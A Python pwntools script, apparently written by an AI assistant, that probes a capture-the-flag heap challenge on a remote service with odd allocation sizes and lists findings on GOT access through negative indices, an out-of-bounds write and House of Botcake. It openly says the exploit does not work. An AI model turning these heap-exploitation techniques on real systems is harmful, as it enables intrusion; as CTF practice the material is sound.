#!/usr/bin/env python3
"""
Last attempt: Since we know puts code is at offset 0x8e640,
try to use that information creatively
"""
from pwn import *

elf = ELF('./chal', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.log_level = 'info'

io = remote('amt.rs', 26797)

def create(idx, size, data):
    io.sendlineafter(b'operation: ', b'1')
    io.sendlineafter(b'note: ', str(idx).encode())
    io.sendlineafter(b'size: ', hex(size).encode())
    io.sendafter(b'data: ', data)

def delete(idx):
    io.sendlineafter(b'operation: ', b'2')
    io.sendlineafter(b'note: ', str(idx).encode())

success("Final attempt - accepting this might not work without proper leak")

# IDEA: What if the challenge is simpler than we think?
# What if it's just about using the OOB to create a specific heap state
# that triggers a vulnerability in glibc itself?

# Or what if we're supposed to use the challenge's limited functionality
# in a creative way we haven't thought of?

info("Let me try: Allocate size 0")
# What happens if size = 0?
try:
    create(0, 0, b'')
    success("Size 0 allocation worked!")
except:
    warn("Size 0 failed")

info("Try: Negative size")
try:
    create(1, -1, b'')  # Might wrap to huge size
    success("Negative size worked!")
except:
    warn("Negative size failed")

info("Try: Very large size")
try:
    create(2, 0xffffffffffffffff, b'')
    success("Max size worked!")
except:
    warn("Max size failed")

info("Since I'm stuck, let me just document what we learned:")
log.info("""
FINDINGS:
---------
1. printf("%s") stops at null bytes - can't leak libc/heap directly
2. GOT entries return libc CODE bytes (we see endbr64)
3. puts is at libc offset 0x8e640
4. We can access GOT via notes[-21] (puts), notes[-22] (free), etc.
5. House of Botcake creates overlapping chunks but still can't leak
6. OOB write corrupts memory but crashes without clean exploit
7. NX is enabled - can't execute shellcode on heap/stack

MISSING PIECE:
--------------
We need a way to leak libc base address OR use ROP without knowing addresses.
The intended solution likely uses a technique we haven't discovered.

RECOMMENDATION:
---------------
Search for the official writeup or ask the challenge author for hints.
The challenge had 11 solves, so it's definitely solvable!
""")

info("I'll leave the connection open for you to experiment")
io.interactive()
